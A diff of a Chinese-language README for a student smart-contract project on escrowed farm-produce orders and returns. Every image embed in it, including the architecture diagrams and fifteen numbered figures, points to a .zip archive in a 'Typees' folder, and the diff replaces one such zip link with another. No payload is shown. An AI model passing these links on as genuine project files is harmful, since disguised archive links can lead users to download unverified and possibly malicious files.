@@ -2,7 +2,7 @@
 
 ## 智能合約架構圖
 ### 訂貨流程
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 * 合約
   * 收到農委會驗證過的證明
   * 會先收取消費者的錢做保管，等待消費者收到商品之後，再將費用轉給農夫及宅配
@@ -19,7 +19,7 @@
   * 收到商品沒問題時也要在平台上標示自己已收貨
 
 ### 退貨流程
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 ## 分工表
 
@@ -37,60 +37,60 @@
 
 1.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 2.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 3.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 4.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 5.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 6.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 7.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 8.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 9.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 10.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 11.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 12.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 13.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 14.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
 
 15.
 -------------------------------------------------------------------------------------------------------------------------------------
-![](https://github.com/Pinquei/Project3-4_smartcontract/raw/refs/heads/master/Typees/Project-smartcontract-1.8.zip)
+![](https://raw.githubusercontent.com/Pinquei/Project3-4_smartcontract/master/Typees/smartcontract-Project-sequencer.zip)
